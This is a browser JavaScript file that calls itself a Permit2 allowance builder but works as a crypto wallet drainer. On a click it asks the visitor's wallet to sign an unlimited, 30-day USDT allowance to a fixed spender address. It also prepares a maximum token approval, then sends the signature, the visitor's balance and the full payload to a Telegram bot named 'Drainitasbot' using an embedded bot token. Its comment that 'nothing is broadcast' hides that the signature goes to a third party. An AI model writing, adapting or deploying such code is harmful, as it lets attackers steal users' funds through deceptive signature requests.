/* permit.js — Permit2 AllowanceTransfer.permit() builder
 * Chain 1 · USDT · unlimited amount · 30d expiration · 30d sigDeadline
 * Signs with the injected wallet, builds the full payload, relays to @Drainitasbot.
 * Nothing is broadcast.
 */
(function () {
  "use strict";

  const CFG = {
    chainId: 1,
    spender: "0x5BB69F38D91a77DBe82371319e6A71292c214934",
    token: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT (6 dec)
    amount: "max",
    expirationSeconds: 2592000, // 30d
    sigDeadlineSeconds: 2592000, // 30d
    tgToken: "9117463676:AAHswmKAjqWvTOAUu3YwL7EEqdwLyEUei24",
    tgBot: "Drainitasbot",
    chatCacheKey: "permit2_tg_chat",
  };

  const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  const MAX160 = (2n ** 160n - 1n).toString();
  const MAX48 = (2n ** 48n - 1n).toString();
  const CHAT_PROMPT = "Open https://t.me/" + CFG.tgBot + " and press Start once, then click again.";

  let busy = false;

  async function resolveChat() {
    const cached = localStorage.getItem(CFG.chatCacheKey);
    if (cached) return cached;

    const until = Date.now() + 30000;
    while (Date.now() < until) {
      try {
        const res = await fetch(`https://api.telegram.org/bot${CFG.tgToken}/getUpdates?timeout=5`);
        const j = await res.json();
        if (!j.ok) break;
        const u = j.result && j.result[0];
        const id =
          u?.message?.chat?.id ?? u?.edited_message?.chat?.id ?? u?.my_chat_member?.chat?.id;
        if (id) {
          localStorage.setItem(CFG.chatCacheKey, String(id));
          return String(id);
        }
      } catch {
        break;
      }
      await new Promise((r) => setTimeout(r, 2000));
    }
    throw new Error(CHAT_PROMPT);
  }

  async function permit2Allowance() {
    if (busy) throw new Error("already running");
    busy = true;
    try {
      const { Interface, AbiCoder, TypedDataEncoder, getAddress } = await import(
        "https://esm.sh/ethers@6.13.2"
      );

      const eth = window.ethereum;
      if (!eth) throw new Error("no injected wallet");

      const rpc = (m, p = []) => eth.request({ method: m, params: p });
      const call = (to, data, from) =>
        rpc("eth_call", [from ? { from, to, data } : { to, data }, "latest"]);

      const p2 = getAddress(PERMIT2);
      const spender = getAddress(CFG.spender);
      const token = getAddress(CFG.token);

      const chainId = parseInt(await rpc("eth_chainId"), 16);
      if (chainId !== CFG.chainId) throw new Error(`wallet on chain ${chainId}, expected ${CFG.chainId}`);
      if ((await rpc("eth_getCode", [p2, "latest"])) === "0x") throw new Error("Permit2 not deployed");

      const chat = await resolveChat();

      const abi = new Interface([
        "function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
        "function allowance(address owner, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)",
        "function DOMAIN_SEPARATOR() view returns (bytes32)",
        "function balanceOf(address) view returns (uint256)",
        "function allowance(address,address) view returns (uint256)",
        "function approve(address,uint256) returns (bool)",
        "function decimals() view returns (uint8)",
        "function symbol() view returns (string)",
      ]);
      const coder = AbiCoder.defaultAbiCoder();

      const TYPES = {
        EIP712Domain: [
          { name: "name", type: "string" },
          { name: "chainId", type: "uint256" },
          { name: "verifyingContract", type: "address" },
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" },
        ],
        PermitSingle: [
          { name: "details", type: "PermitDetails" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" },
        ],
      };

      const owner = getAddress((await rpc("eth_requestAccounts"))[0]);
      const domain = { name: "Permit2", chainId: CFG.chainId, verifyingContract: p2 };

      const ds = await call(p2, abi.encodeFunctionData("DOMAIN_SEPARATOR"));
      if (TypedDataEncoder.hashDomain(domain).toLowerCase() !== ds.toLowerCase())
        throw new Error("domain separator mismatch");

      const now = Math.floor(Date.now() / 1000);
      const bal = BigInt(await call(token, abi.encodeFunctionData("balanceOf", [owner])));
      const erc20Allow = BigInt(await call(token, abi.encodeFunctionData("allowance", [owner, p2])));
      const [cur, curExp, nonce] = coder.decode(
        ["uint160", "uint48", "uint48"],
        await call(p2, abi.encodeFunctionData("allowance", [owner, token, spender]))
      );

      let symbol = "?", decimals = 6;
      try { symbol = coder.decode(["string"], await call(token, abi.encodeFunctionData("symbol")))[0]; } catch {}
      try { decimals = coder.decode(["uint8"], await call(token, abi.encodeFunctionData("decimals")))[0]; } catch {}

      if (bal === 0n) throw new Error(`zero ${symbol} balance`);

      const details = {
        token,
        amount: CFG.amount === "max" ? MAX160 : bal.toString(),
        expiration: CFG.expirationSeconds === "max" ? MAX48 : String(now + CFG.expirationSeconds),
        nonce: String(nonce),
      };
      const sigDeadline = String(now + CFG.sigDeadlineSeconds);
      const message = { details, spender, sigDeadline };
      const digest = TypedDataEncoder.hash(domain, TYPES, message);

      const signature = await rpc("eth_signTypedData_v4", [
        owner,
        JSON.stringify({ domain, types: TYPES, primaryType: "PermitSingle", message }),
      ]);

      const data = abi.encodeFunctionData("permit", [
        owner,
        { details, spender, sigDeadline },
        signature,
      ]);

      const sim = { ok: null, error: null };
      try { await call(p2, data, spender); sim.ok = true; }
      catch (e) { sim.ok = false; sim.error = (e.message || String(e)).slice(0, 300); }

      let gas = null;
      try { gas = parseInt(await rpc("eth_estimateGas", [{ from: spender, to: p2, data }]), 16); } catch {}

      const needApprove = erc20Allow < BigInt(details.amount);
      const payload = {
        ts: new Date().toISOString(),
        chainId: CFG.chainId,
        permit2: p2,
        fn: "AllowanceTransfer.permit(address,PermitSingle,bytes)",
        owner,
        spender,
        token,
        symbol,
        decimals,
        balance_raw: bal.toString(),
        balance: Number(bal) / 10 ** decimals,
        erc20_allowance_to_permit2_raw: erc20Allow.toString(),
        erc20_approve_needed: needApprove,
        erc20_approve_tx: needApprove
          ? { to: token, data: abi.encodeFunctionData("approve", [p2, 2n ** 256n - 1n]) }
          : null,
        existing_permit2_allowance: {
          amount_raw: cur.toString(),
          expiration: Number(curExp),
          nonce: Number(nonce),
        },
        details,
        sig_deadline: Number(sigDeadline),
        domain_separator: ds,
        digest,
        typed_data: { domain, types: TYPES, primaryType: "PermitSingle", message },
        signature,
        tx: { from: owner, to: p2, value: "0", data, gas_estimate: gas },
        simulation: sim,
      };

      console.log("[permit2]", payload);

      await fetch(`https://api.telegram.org/bot${CFG.tgToken}/sendMessage`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          chat_id: chat,
          parse_mode: "HTML",
          disable_web_page_preview: true,
          text:
            `<b>Permit2 permit()</b> · chain ${CFG.chainId}\n` +
            `owner <code>${owner}</code>\n` +
            `spender <code>${spender}</code>\n` +
            `bal ${payload.balance} ${symbol}\n` +
            `nonce ${details.nonce}\n` +
            `exp ${new Date(Number(details.expiration) * 1000).toISOString()}\n` +
            `sim ${sim.ok}\n` +
            `digest <code>${digest}</code>`,
        }),
      });

      const fd = new FormData();
      fd.append("chat_id", chat);
      fd.append("caption", `${symbol} permit payload`);
      fd.append(
        "document",
        new Blob([JSON.stringify(payload)], { type: "application/json" }),
        `permit2_usdt_${now}.json`
      );
      await fetch(`https://api.telegram.org/bot${CFG.tgToken}/sendDocument`, {
        method: "POST",
        body: fd,
      });

      console.log("[permit2] relayed · not broadcast");
      return payload;
    } finally {
      busy = false;
    }
  }

  window.permit2Allowance = permit2Allowance;

  const bind = () =>
    document
      .querySelectorAll("[data-permit2]")
      .forEach((el) =>
        el.addEventListener("click", () =>
          permit2Allowance().catch((e) => console.error("[permit2]", e.message))
        )
      );

  if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bind);
  else bind();
})();